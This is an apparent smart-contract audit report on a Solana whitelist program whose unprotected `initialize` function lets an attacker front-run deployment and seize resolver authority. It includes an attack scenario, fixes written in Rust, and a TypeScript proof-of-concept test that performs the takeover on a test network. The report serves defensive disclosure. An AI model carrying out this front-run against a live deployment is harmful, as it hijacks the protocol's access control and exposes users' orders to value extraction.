# Audit Report

## Title
Unprotected Whitelist Initialization Enables Complete Access Control Takeover

## Summary
The whitelist program's `initialize` function lacks access control, allowing any attacker to front-run the legitimate initialization and become the whitelist authority. This grants complete control over resolver registration, breaking the protocol's fundamental access control mechanism.

## Finding Description

The whitelist program contains a critical initialization vulnerability where the `initialize()` function has no access control restrictions. [1](#0-0) 

The `Initialize` account validation context only requires a signer but does not restrict who that signer can be: [2](#0-1) 

The WhitelistState account stores the authority that controls all resolver registration operations: [3](#0-2) 

This authority is then enforced in critical operations like registering resolvers [4](#0-3)  and deregistering them [5](#0-4) , as well as transferring authority [6](#0-5) .

The WhitelistState discriminator is defined as [246, 118, 44, 60, 71, 37, 201, 55] in the IDL: [7](#0-6) 

**Attack Scenario:**

1. Protocol team deploys the whitelist program to mainnet
2. Attacker monitors the deployment and identifies the WhitelistState PDA address
3. Before the protocol can call `initialize()`, the attacker submits a transaction calling `initialize()` with their own keypair as the signer
4. The WhitelistState account is created at the canonical PDA with the correct discriminator [246, 118, 44, 60, 71, 37, 201, 55], but with the **attacker's public key as authority** (invalid/malicious data from the protocol's perspective)
5. When the protocol attempts to initialize, the transaction fails because the account already exists
6. The attacker now controls the whitelist authority and can:
   - Register malicious resolvers who can fill orders at unfavorable prices
   - Deregister legitimate resolvers, preventing them from executing orders
   - Transfer authority to confederates
   - Completely compromise the protocol's access control system

The fusion-swap program relies on whitelisted resolvers for order filling [8](#0-7)  and cancellation by resolver [9](#0-8) , making this vulnerability critical to the entire protocol.

## Impact Explanation

**Severity: HIGH**

This vulnerability enables complete compromise of the protocol's access control system with the following impacts:

1. **Access Control Bypass**: An attacker becomes the whitelist authority and can authorize any resolver, breaking Critical Invariant #5 ("Only authorized resolvers can fill orders")

2. **Unauthorized Order Execution**: Malicious resolvers can fill orders at prices favorable to themselves, extracting value from makers

3. **Protocol Disruption**: Attacker can deregister all legitimate resolvers, preventing normal protocol operation

4. **Permanent Compromise**: Once initialized with the wrong authority, there's no recovery mechanism - the protocol team would need to redeploy with a new program ID

5. **Multi-User Impact**: Affects all protocol users, as the entire resolver authorization system is compromised

The impact is categorized as HIGH (not CRITICAL) because while it compromises access control, it requires front-running during initial deployment and doesn't enable direct token theft from existing escrows. However, it enables significant value extraction through malicious order fills.

## Likelihood Explanation

**Likelihood: HIGH**

This attack is highly likely to succeed because:

1. **Simple Execution**: Requires only a single transaction with no complex setup
2. **Low Cost**: Attacker only needs minimal SOL for transaction fees
3. **No Prerequisites**: No special permissions or prior state required
4. **Detectable Timing**: Program deployment is visible on-chain, giving attackers time to prepare
5. **Single Point of Failure**: The protocol has only one chance to initialize correctly
6. **Known Attack Vector**: Front-running initialization is a well-documented vulnerability pattern in blockchain systems

The test suite shows awareness of the race condition but implements no protection: [10](#0-9) 

## Recommendation

Implement one of the following mitigations:

**Option 1: Hardcoded Authority (Recommended)**
Add a hardcoded authority check or use a program upgrade authority constraint:

```rust
pub fn initialize(ctx: Context<Initialize>) -> Result<()> {
    // Only allow program upgrade authority to initialize
    require_keys_eq!(
        ctx.accounts.authority.key(),
        EXPECTED_AUTHORITY_PUBKEY, // Set this to your team's pubkey
        WhitelistError::Unauthorized
    );
    
    let whitelist_state = &mut ctx.accounts.whitelist_state;
    whitelist_state.authority = ctx.accounts.authority.key();
    Ok(())
}
```

**Option 2: One-Time Initialization in Program Deployment**
Initialize the WhitelistState account as part of the program deployment using an init instruction that can only be called once, or initialize it in the program's deploy script atomically.

**Option 3: Program Upgrade Authority Check**
Use Anchor's program data account to verify the initializer is the program's upgrade authority:

```rust
use anchor_lang::accounts::program::Program;

#[derive(Accounts)]
pub struct Initialize<'info> {
    #[account(mut)]
    pub authority: Signer<'info>,
    
    /// CHECK: Validated as program upgrade authority
    #[account(
        constraint = program_data.upgrade_authority_address == Some(authority.key()) 
            @ WhitelistError::Unauthorized
    )]
    pub program_data: Account<'info, ProgramData>,
    
    #[account(
        init,
        payer = authority,
        space = DISCRIMINATOR + WhitelistState::INIT_SPACE,
        seeds = [WHITELIST_STATE_SEED],
        bump,
    )]
    pub whitelist_state: Account<'info, WhitelistState>,
    
    pub system_program: Program<'info, System>,
}
```

## Proof of Concept

The following TypeScript test demonstrates the vulnerability:

```typescript
import * as anchor from "@coral-xyz/anchor";
import { Program } from "@coral-xyz/anchor";
import { Whitelist } from "../target/types/whitelist";
import { expect } from "chai";

describe("Initialization Front-Running Attack", () => {
  const provider = anchor.AnchorProvider.env();
  anchor.setProvider(provider);
  
  const program = anchor.workspace.Whitelist as Program<Whitelist>;
  
  it("Attacker can front-run initialization and become authority", async () => {
    // Attacker's keypair
    const attacker = anchor.web3.Keypair.generate();
    
    // Fund attacker
    await provider.connection.requestAirdrop(
      attacker.publicKey,
      1 * anchor.web3.LAMPORTS_PER_SOL
    );
    await new Promise(resolve => setTimeout(resolve, 1000));
    
    // Derive WhitelistState PDA
    const [whitelistStatePDA] = anchor.web3.PublicKey.findProgramAddressSync(
      [Buffer.from("whitelist_state")],
      program.programId
    );
    
    // Attacker front-runs and calls initialize first
    await program.methods
      .initialize()
      .accountsPartial({
        authority: attacker.publicKey,
        whitelistState: whitelistStatePDA,
      })
      .signers([attacker])
      .rpc();
    
    // Verify attacker is now the authority
    const whitelistState = await program.account.whitelistState.fetch(whitelistStatePDA);
    expect(whitelistState.authority.toString()).to.equal(attacker.publicKey.toString());
    
    // Attacker can now register malicious resolvers
    const maliciousResolver = anchor.web3.Keypair.generate();
    
    await program.methods
      .register(maliciousResolver.publicKey)
      .accountsPartial({
        authority: attacker.publicKey,
      })
      .signers([attacker])
      .rpc();
    
    console.log("✓ Attacker successfully took over whitelist authority");
    console.log("✓ Attacker can now register malicious resolvers");
    
    // Protocol team's legitimate initialize would fail
    const protocolAuthority = anchor.web3.Keypair.generate();
    await provider.connection.requestAirdrop(
      protocolAuthority.publicKey,
      1 * anchor.web3.LAMPORTS_PER_SOL
    );
    await new Promise(resolve => setTimeout(resolve, 1000));
    
    try {
      await program.methods
        .initialize()
        .accountsPartial({
          authority: protocolAuthority.publicKey,
          whitelistState: whitelistStatePDA,
        })
        .signers([protocolAuthority])
        .rpc();
      
      expect.fail("Protocol initialization should have failed");
    } catch (err) {
      console.log("✓ Protocol team's legitimate initialization failed (account already exists)");
    }
  });
});
```

**Reproduction Steps:**

1. Deploy the whitelist program to a test network
2. Before calling the legitimate initialize, have an attacker call `initialize()` with their own keypair
3. Observe that the WhitelistState account is created with the attacker's public key as authority
4. Verify the attacker can now register/deregister resolvers
5. Attempt to call initialize again with the protocol authority - it will fail

This directly demonstrates how an attacker can create the WhitelistState account with the correct discriminator [246, 118, 44, 60, 71, 37, 201, 55] but with invalid (malicious) authority data, completely bypassing the intended access control.

### Citations

**File:** programs/whitelist/src/lib.rs (L18-22)
```rust
    pub fn initialize(ctx: Context<Initialize>) -> Result<()> {
        let whitelist_state = &mut ctx.accounts.whitelist_state;
        whitelist_state.authority = ctx.accounts.authority.key();
        Ok(())
    }
```

**File:** programs/whitelist/src/lib.rs (L43-58)
```rust
#[derive(Accounts)]
pub struct Initialize<'info> {
    #[account(mut)]
    pub authority: Signer<'info>,

    #[account(
        init,
        payer = authority,
        space = DISCRIMINATOR + WhitelistState::INIT_SPACE,
        seeds = [WHITELIST_STATE_SEED],
        bump,
    )]
    pub whitelist_state: Account<'info, WhitelistState>,

    pub system_program: Program<'info, System>,
}
```

**File:** programs/whitelist/src/lib.rs (L66-72)
```rust
    #[account(
      seeds = [WHITELIST_STATE_SEED],
      bump,
      // Ensures only the whitelist authority can register new users
      constraint = whitelist_state.authority == authority.key() @ WhitelistError::Unauthorized
    )]
    pub whitelist_state: Account<'info, WhitelistState>,
```

**File:** programs/whitelist/src/lib.rs (L92-98)
```rust
    #[account(
      seeds = [WHITELIST_STATE_SEED],
      bump,
      // Ensures only the whitelist authority can deregister users from the whitelist
      constraint = whitelist_state.authority == authority.key() @ WhitelistError::Unauthorized
    )]
    pub whitelist_state: Account<'info, WhitelistState>,
```

**File:** programs/whitelist/src/lib.rs (L115-122)
```rust
    #[account(
        mut,
        seeds = [WHITELIST_STATE_SEED],
        bump,
        // Ensures only the current authority can set new authority
        constraint = whitelist_state.authority == current_authority.key() @ WhitelistError::Unauthorized
    )]
    pub whitelist_state: Account<'info, WhitelistState>,
```

**File:** programs/whitelist/src/lib.rs (L125-129)
```rust
#[account]
#[derive(InitSpace)]
pub struct WhitelistState {
    pub authority: Pubkey,
}
```

**File:** idl/whitelist.json (L326-337)
```json
      "name": "WhitelistState",
      "discriminator": [
        246,
        118,
        44,
        60,
        71,
        37,
        201,
        55
      ]
    }
```

**File:** programs/fusion-swap/src/lib.rs (L511-516)
```rust
    #[account(
        seeds = [whitelist::RESOLVER_ACCESS_SEED, taker.key().as_ref()],
        bump = resolver_access.bump,
        seeds::program = whitelist::ID,
    )]
    resolver_access: Account<'info, whitelist::ResolverAccess>,
```

**File:** programs/fusion-swap/src/lib.rs (L647-653)
```rust
    /// Account allowed to cancel the order
    #[account(
        seeds = [whitelist::RESOLVER_ACCESS_SEED, resolver.key().as_ref()],
        bump = resolver_access.bump,
        seeds::program = whitelist::ID,
    )]
    resolver_access: Account<'info, whitelist::ResolverAccess>,
```

**File:** tests/utils/utils.ts (L481-502)
```typescript
  try {
    await program.account.whitelistState.fetch(whitelistStatePDA);
  } catch (e) {
    const isBankrun = program.provider instanceof BankrunProvider;
    if (
      (!isBankrun &&
        e.toString().includes(ANCHOR_ACCOUNT_NOT_FOUND_ERROR_PREFIX)) ||
      (isBankrun &&
        e.toString().includes(BANKRUN_ACCOUNT_NOT_FOUND_ERROR_PREFIX))
    ) {
      // Whitelist state does not exist, initialize it
      await program.methods
        .initialize()
        .accountsPartial({
          authority: authority.publicKey,
        })
        .signers([authority])
        .rpc();
    } else {
      throw e; // Re-throw if it's a different error
    }
  }
```
